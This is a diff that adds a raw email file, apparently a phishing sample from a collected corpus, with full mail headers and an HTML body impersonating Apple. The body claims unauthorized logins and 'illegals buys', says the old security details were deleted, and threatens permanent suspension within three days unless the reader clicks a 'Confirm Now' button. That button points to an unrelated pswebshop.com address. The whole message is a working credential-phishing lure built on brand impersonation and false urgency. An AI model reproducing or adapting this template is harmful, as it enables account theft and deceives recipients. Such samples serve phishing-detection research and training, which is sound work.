@@ -1,0 +1,78 @@
+Return-Path: customer-apple@hkbn.net
+Delivered-To: jose@monkey.org
+X-FDA: 71633982966.20.men97_6c1ef574d2d2c
+X-Spam-Summary: 2,0,0,f69f6b0134fe36e1,d41d8cd98f00b204,customer-apple@hkbn.net,:,RULES_HIT:41:72:152:355:375:379:541:960:962:967:973:978:983:988:989:1189:1208:1224:1260:1261:1263:1311:1313:1314:1345:1373:1381:1431:1433:1434:1437:1515:1516:1517:1534:1543:1571:1588:1589:1593:1594:1623:1711:1714:1730:1747:1777:1792:1803:2198:2199:2393:2525:2527:2543:2559:2563:2610:2682:2685:2693:2859:2890:2894:2895:2896:2900:2902:2909:2923:2924:2925:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3148:3351:3865:3866:3867:3868:3870:3872:3873:3874:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4039:4042:4321:4605:5007:6119:6238:6261:6650:6674:7628:7903:8603:8778:9025:9388:9908:10004:10049:10346:10881:11026:11257:11656:11658:11914:12043:12050:12555:12955:12958:12967:13374:14093:14094:14096:14181:14659:14721:21063:21080:21433:30001:30016:30054:30065:30070:30075,0,RBL:173.224.64.221:@hkbn.net:.lbl8.mailshell.net-62.16.0.100 64.201.201.201,CacheIP:none,Bayesian:0.5,0.5,0.5,Netch
+X-HE-Tag: men97_6c1ef574d2d2c
+X-Filterd-Recvd-Size: 4969
+Received: from mail.atni.net (mail.atni.net [173.224.64.221])
+	by imf21.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Thu, 16 Jun 2016 16:49:02 +0000 (UTC)
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by mail.atni.net (Postfix) with ESMTP id D5568202219F
+	for <jose@monkey.org>; Thu, 16 Jun 2016 12:49:19 -0400 (EDT)
+Received: from mail.atni.net ([127.0.0.1])
+	by localhost (mail.atni.net [127.0.0.1]) (amavisd-new, port 10032)
+	with ESMTP id LuaYlDnHHR9k for <jose@monkey.org>;
+	Thu, 16 Jun 2016 12:49:19 -0400 (EDT)
+Received: from localhost (localhost.localdomain [127.0.0.1])
+	by mail.atni.net (Postfix) with ESMTP id 8E48D202227E
+	for <jose@monkey.org>; Thu, 16 Jun 2016 12:49:19 -0400 (EDT)
+X-Virus-Scanned: amavisd-new at atni.net
+Received: from mail.atni.net ([127.0.0.1])
+	by localhost (mail.atni.net [127.0.0.1]) (amavisd-new, port 10026)
+	with ESMTP id w5yDWGcMyTfn for <jose@monkey.org>;
+	Thu, 16 Jun 2016 12:49:19 -0400 (EDT)
+Received: from WIN-8J5HCTI7JH6 (unknown [96.61.128.26])
+	by mail.atni.net (Postfix) with ESMTP id 4A5C3202219F
+	for <jose@monkey.org>; Thu, 16 Jun 2016 12:49:19 -0400 (EDT)
+Date: Thu, 16 Jun 2016 12:48:46 -0400 (EDT)
+From: Customer Apple <customer-apple@hkbn.net>
+To: jose@monkey.org
+Message-ID: <2076712390.1123.1466095726190.JavaMail.WIN-8J5HCTI7JH6$@mail.myphoneaccount.com>
+Subject: Confirm your informations !
+MIME-Version: 1.0
+Content-Type: text/html; charset=UTF-8
+Content-Transfer-Encoding: 7bit
+X-Mailer: ColdFusion 9 Application Server
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 265
+
+<HTML><head>
+
+<style type="text/css"> "https://statici.icloud.com/emailimages/v4/common/apple_logo_web%402x.png"
+ .link:link, .link:active, .link:visited {
+       color:#2672ec !important;
+       text-decoration:none !important;
+ }
+
+ .link:hover {
+       color:#4284ee !important;
+       text-decoration:none !important;
+ }
+</style>
+<title></title>
+</head>
+<body><TABLE dir=ltr>
+<TBODY>
+<TR>
+<TD id=i1 style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 17px; PADDING-BOTTOM: 0px; COLOR: #707070; PADDING-TOP: 0px; FONT-FAMILY: 'Segoe UI Semibold', 'Segoe UI Bold', 'Segoe UI', 'Helvetica Neue Medium', Arial, sans-serif"></TD></TR>
+<TR>
+<TD id=i2 style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 41px; PADDING-BOTTOM: 0px; COLOR: #2672ec; PADDING-TOP: 0px; FONT-FAMILY: 'Segoe UI Light', 'Segoe UI', 'Helvetica Neue Medium', Arial, sans-serif">Apple : Confirm your informations !</TD></TR>
+<TR>
+<TD id=i4 style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 14px; PADDING-BOTTOM: 0px; COLOR: #2a2a2a; PADDING-TOP: 25px; FONT-FAMILY: 'Segoe UI', Tahoma, Verdana, Arial, sans-serif">Recently, we have detected different logins on your account followed by some illegals buys and we think that someone have hacked it. <A class=link id=iAccount dir=ltr style="COLOR: #2672ec; TEXT-DECORATION: none" a <>.</A></TD></TR>
+<TR>
+<TD id=i7 style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 14px; PADDING-BOTTOM: 0px; COLOR: #2a2a2a; PADDING-TOP: 6px; FONT-FAMILY: 'Segoe UI', Tahoma, Verdana, Arial, sans-serif">As part of this process, your old security infos have been deleted, open your account by clicking the "renew" button and update your informations after logging in.<A class=link id=iAccount dir=ltr style="COLOR: #2672ec; TEXT-DECORATION: none" a <></A></TD></TR>
+<TR>
+<TD id=i8 style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 14px; PADDING-BOTTOM: 0px; COLOR: #2a2a2a; PADDING-TOP: 6px; FONT-FAMILY: 'Segoe UI', Tahoma, Verdana, Arial, sans-serif">We will give you 3 days to update your informations or we will suspend your account forever.<A class=link id=iAccount dir=ltr style="COLOR: #2672ec; TEXT-DECORATION: none" a <></A></TD></TR>
+<TR>
+<TD style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 14px; PADDING-BOTTOM: 0px; COLOR: #2a2a2a; PADDING-TOP: 25px; FONT-FAMILY: 'Segoe UI', Tahoma, Verdana, Arial, sans-serif">
+<TABLE cellSpacing=0 border=0>
+<TBODY>
+<TR>
+<TD style="PADDING-RIGHT: 20px; MIN-WIDTH: 50px; PADDING-LEFT: 20px; PADDING-BOTTOM: 5px; PADDING-TOP: 5px; BACKGROUND-COLOR: #2672ec" bgColor=#2672ec><A id=i9 style="FONT-WEIGHT: 600; FONT-SIZE: 14px; COLOR: #fff; FONT-FAMILY: 'Segoe UI Semibold', 'Segoe UI Bold', 'Segoe UI', 'Helvetica Neue Medium', Arial, sans-serif; LETTER-SPACING: 0.02em; TEXT-ALIGN: center; TEXT-DECORATION: none" href="http://service-telecom-452213834.pswebshop.com/attendd">Confirm Now </A></TD></TR></TBODY></TABLE></TD></TR>
+<TR>
+<TD style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 14px; PADDING-BOTTOM: 0px; COLOR: #2a2a2a; PADDING-TOP: 25px; FONT-FAMILY: 'Segoe UI', Tahoma, Verdana, Arial, sans-serif">Thanks,</TD></TR>
+<TR>
+<TD id=i12 style="PADDING-RIGHT: 0px; PADDING-LEFT: 0px; FONT-SIZE: 14px; PADDING-BOTTOM: 0px; COLOR: #2a2a2a; PADDING-TOP: 0px; FONT-FAMILY: 'Segoe UI', Tahoma, Verdana, Arial, sans-serif">The&nbsp;Apple account team</TD></TR></TBODY></TABLE></BODY></HTML> 
